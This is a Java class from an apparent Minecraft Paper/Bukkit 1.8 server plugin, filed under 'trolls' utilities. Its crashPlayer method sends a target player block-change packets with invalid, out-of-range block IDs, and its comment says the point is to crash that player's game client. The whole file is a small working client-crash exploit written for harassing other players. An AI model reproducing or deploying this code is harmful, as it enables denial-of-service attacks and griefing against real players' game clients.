package net.octopvp.octocore.paper.utils.trolls;

import net.minecraft.server.v1_8_R3.EntityPlayer;
import org.bukkit.craftbukkit.v1_8_R3.entity.CraftPlayer;
import org.bukkit.entity.Player;

import java.util.Random;

/**
 * Actually crashes the client pog
 */
public class CrashClient {
    public void crashPlayer(Player target) {
        Random random = new Random(System.currentTimeMillis());
        for (int i = 0; i < 10; i++) {
            target.sendBlockChange(target.getLocation(), random.nextInt(2674) - 1337, (byte) 0);
        }
        target.sendBlockChange(target.getLocation(), -6666, (byte) 0);
        target.sendBlockChange(target.getLocation(), 6666, (byte) 0);
    }
}
